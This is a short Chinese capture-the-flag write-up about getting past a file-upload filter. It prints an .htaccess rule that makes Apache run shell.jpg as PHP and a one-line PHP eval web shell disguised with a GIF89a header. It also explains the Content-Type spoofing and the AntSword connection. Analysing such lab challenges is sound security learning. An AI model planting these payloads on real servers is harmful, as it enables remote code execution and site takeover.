这个b让我觉得有必要记录一下。
当我按照之前套路走后，回显`文件名不能含ph`，于是又上传了png文件，结果来句`太露骨`。。。
不过尝试jpg文件成功上传。

有爆破或者404报错界面（server类型apache），然后可用.htaccess配置文件，允许服务器将`shell.jpg`解析为php。
上传`.htaccess`文件内容如下

```htaccess
<FilesMatch "shell.jpg">

 SetHandler application/x-httpd-php

</FilesMatch>

```
记得把`Content-Type`修改为`image/jpeg`。
上传后显示
`/var/www/html/upload/2b4099bc206448afdc0ffdf443242c6c/.htaccess succesfully uploaded!`

再上传`shell.jpg`，其内容是(对php文件有过滤所以上script)
```javascript
GIF89a//可有可无
<script language='php'>eval($_POST['shell'])</script>
```
我们再用AntSword连接：
`https://xxx/upload/2b4099bc206448afdc0ffdf443242c6c/shell.jpg`，接下来same就可以得到flag。

---
参考：
<a href=https://www.cnblogs.com/PsgQ/p/14573972.html#/c/subject/p/14573972.html>PS5</a>

<a href=https://zhuanlan.zhihu.com/p/370029419>Content-Type</a>比较重要的一句就是`Content-Type表示内容类型和字符编码。内容类型也叫做MIME类型。是Internet Media Type，互联网媒体类型。在互联网上传输的数据有不同的数据类型，HTTP在传输数据对象时会为他们打上称为MIME的数据格式标签，用于区分数据类型。`绕过过滤机制就是靠这个。

<a href=https://www.cnblogs.com/engeng/articles/5948089.html>.htaccess是什么</a>在文件上传里面的作用`MIME类型配置以及访问权限控制等`